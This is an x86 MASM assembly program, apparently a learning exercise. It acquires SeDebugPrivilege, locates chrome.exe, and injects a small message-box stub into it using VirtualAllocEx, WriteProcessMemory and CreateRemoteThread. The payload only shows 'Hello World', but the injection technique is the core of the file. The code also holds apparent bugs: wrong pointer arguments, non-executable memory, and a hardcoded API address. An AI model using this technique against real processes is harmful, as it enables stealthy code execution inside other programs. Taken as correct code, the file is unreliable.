include masm32rt.inc
include shlwapi.inc
include msvcrt.inc
include advapi32.inc
include win32k.inc

includelib advapi32.lib
includelib msvcrt.lib
includelib shlwapi.lib

PROCESSENTRY32W STRUCT
    dwSize              DWORD ?
    cntUsage            DWORD ?
    th32ProcessID       DWORD ?
    th32DefaultHeapID   DWORD ?
    th32ModuleID        DWORD ?
    cntThreads          DWORD ?
    th32ParentProcessID DWORD ?
    pcPriClassBase      DWORD ?
    dwFlags             DWORD ?
    szExeFile           dw MAX_PATH dup(?)
PROCESSENTRY32W ENDS

;'e','x','p','l','o','r','e','r','.','e','x','e',0
;'c','h','r','o','m','e','.','e','x','e',0
.data
process_name dw 'c','h','r','o','m','e','.','e','x','e',0
caption db "Teuzero",0
text db "Hello World",0

se_debug db "SeDebugPrivilege",0

.data?
    pe32W PROCESSENTRY32W <>
    hProcessSnap HANDLE 10 dup (?)
    process_id dw 10 dup (?)
    remote_thread LPVOID 10 dup (?)
    address_text  LPVOID 10 dup (?)
    address_caption LPVOID 10 dup (?)
    hToken HANDLE ?
    priv TOKEN_PRIVILEGES <>
    luid PLUID 2 dup (?)
    
.code
    start:
        ;OpenProcessToken
        invoke GetCurrentProcess
        invoke OpenProcessToken,eax,TOKEN_ADJUST_PRIVILEGES, OFFSET hToken
        test eax,eax
        jz fail
        invoke LookupPrivilegeValue,0,OFFSET se_debug,OFFSET priv.Privileges[0].Luid
        test eax,eax
        jz fail
        mov priv.PrivilegeCount, 1d
        mov priv.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
        invoke AdjustTokenPrivileges,hToken,0,addr priv,sizeof TOKEN_PRIVILEGES,0,0
        test eax,eax
        jz fail
        invoke CloseHandle, hToken
        jmp take_process_snap
        
        fail:
            invoke CloseHandle,hToken
            ret
        
        take_process_snap:
        push 0
        push TH32CS_SNAPPROCESS
        call CreateToolhelp32Snapshot
        
        mov hProcessSnap, eax
        
        find_first_process:
            mov pe32W.dwSize, sizeof pe32W
            push offset pe32W
            push hProcessSnap
            call Process32FirstW
        
        find_next_process:
            push offset pe32W
            push hProcessSnap
            call Process32NextW
            
            inc eax
            
            push OFFSET process_name
            push OFFSET pe32W.szExeFile
            call StrCmpW
            cmp eax, FALSE
            je show_pid_and_name
            jmp find_next_process
            
        show_pid_and_name:
            push offset pe32W.szExeFile
            call StdOutW
            
            printf("\n")
            
            push offset process_id
            push pe32W.th32ProcessID
            call dwtoa
            
            push offset process_id
            call StdOut
            
        ;OpenProcess
            push pe32W.th32ProcessID
            push FALSE
            push PROCESS_ALL_ACCESS
            call OpenProcess
            mov edi,eax
            
            nop
            
            ;VirtualAllocEx
            push PAGE_READWRITE
            push MEM_COMMIT
            push 8d ; size allocated 
            push 0
            push edi
            call VirtualAllocEx
            mov address_caption, eax
            
            nop
            
            ;WriteProcessMemory
            push 0
            push 8d ; size written
            push OFFSET caption
            push OFFSET address_caption
            push edi
            call WriteProcessMemory
            
            ;VirtualAllocEx
            push PAGE_READWRITE
            push MEM_COMMIT
            push 0ch ; size allocated 
            push 0
            push edi
            call VirtualAllocEx
            mov address_text, eax
            nop
            
            ;WriteProcessMemory
            push 0
            push 0ch ; size written
            push OFFSET text
            push OFFSET address_text
            push edi
            call WriteProcessMemory
            
            jmp writte_func
            
            
            msgBox:
                push 0
                push OFFSET address_text
                push OFFSET address_caption
                push 0
                mov eax, 0760A0BA0h
                call eax
                ret
          
            
            writte_func:
                ;VirtualAllocEx
                push PAGE_READWRITE
                push MEM_COMMIT
                push 25d ; size allocated 
                push 0
                push edi
                call VirtualAllocEx
                mov remote_thread, eax
                nop
                
                ;WriteProcessMemory
                push 0
                push 25d
                push CS:[msgBox]
                push eax
                push edi
                call WriteProcessMemory
            
            call_thread:
                push 0
                push 0
                push 0
                push remote_thread
                push 0
                push 0
                push edi
                call CreateRemoteThread     
end start
